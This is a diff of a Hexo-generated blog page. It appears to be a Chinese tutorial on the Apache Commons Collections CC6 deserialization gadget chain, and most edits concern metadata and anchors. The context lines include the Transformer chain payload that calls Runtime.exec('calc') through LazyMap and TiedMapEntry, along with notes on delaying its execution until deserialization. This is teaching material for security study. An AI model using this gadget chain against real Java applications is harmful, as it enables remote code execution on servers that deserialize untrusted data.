@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -32,8 +32,8 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/java130.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/java131.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/java132.png">
-<meta property="article:published_time" content="2022-10-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-23T13:21:32.543Z">
+<meta property="article:published_time" content="2022-10-23T07:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-18T16:56:03.890Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="java安全系列">
 <meta property="article:tag" content="反序列化">
@@ -156,7 +156,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#zhao-zhi-qian-de-lian-zi"><span class="nav-number">1.</span> <span class="nav-text">找之前的链子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jie-jue-zai-xu-lie-hua-de-shi-hou-jiu-dan-chu-ji-suan-qi-de-wen-ti"><span class="nav-number">2.</span> <span class="nav-text">解决在序列化的时候就弹出计算器的问题</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E4%B9%8B%E5%89%8D%E7%9A%84%E9%93%BE%E5%AD%90"><span class="nav-number">1.</span> <span class="nav-text">找之前的链子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E5%9C%A8%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">解决在序列化的时候就弹出计算器的问题</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -171,7 +171,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -182,7 +182,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -273,10 +273,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-10-23 00:00:00 / 修改时间：21:21:32" itemprop="dateCreated datePublished" datetime="2022-10-23T00:00:00+08:00">2022-10-23</time>
+      <time title="创建时间：2022-10-23 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-23T00:00:00-07:00">2022-10-23</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2024-01-18 08:56:03" itemprop="dateModified" datetime="2024-01-18T08:56:03-08:00">2024-01-18</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -308,13 +314,13 @@
         <p>cc6的攻击链后面部分(尾部exec方法)也和之前cc1的一样。<br>
 特点： CC6 链，可以不受 jdk 版本制约。</p>
 <p>LayzMap的get()–&gt;this.factory.transformer()–&gt;ChainedTransformer.transform()–&gt;InvokerTransformer.transform()–&gt;runtime.exec</p>
-<a id="more"></a>
+<span id="more"></span>
 <p>这段攻击链代码不变。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br></pre></td></tr></table></figure></div>
 <blockquote>
 <p>如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS</p>
 </blockquote>
-<h3 id="zhao-zhi-qian-de-lian-zi" id="找之前的链子">找之前的链子</h3>
+<h3 id="找之前的链子">找之前的链子</h3>
 <p>根据 ysoSerial 官方的链子，是 TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span></span></span><br></pre></td></tr></table></figure></div>
 <p>并且他还继承了Serializable方法，可被序列化，而且还是public方法。(我们就不需要反射获取它的方法，可以直接调用并修改。)</p>
@@ -332,7 +338,7 @@ HashMap.put() --&gt; putvul --&gt; hash --&gt;URL hashCode。<br>
 HashMap.put() --&gt; putvul --&gt; hash --&gt;TideMapEntry hashCode。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; HashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">HashMap1.put(TiedMapget,<span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 <p><img src="/imgss/java129.png" alt=""></p>
-<h3 id="jie-jue-zai-xu-lie-hua-de-shi-hou-jiu-dan-chu-ji-suan-qi-de-wen-ti" id="解决在序列化的时候就弹出计算器的问题">解决在序列化的时候就弹出计算器的问题</h3>
+<h3 id="解决在序列化的时候就弹出计算器的问题">解决在序列化的时候就弹出计算器的问题</h3>
 <p>但是老问题(之前URLDNS遇到过)又来了，序列化的时候就被调用。所以我们要处理一下这部分。</p>
 <p>参考 URLDNS 链中的思想，先在执行 put() 方法的时候，先不让其进行命令执行，在反序列化的时候再命令执行。</p>
 <p>代码中的话，其实就是一层套一层，我们改哪个都行。<br>
@@ -396,7 +402,7 @@ HashMap.put() --&gt; putvul --&gt; hash --&gt;TideMapEntry hashCode。</p>
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
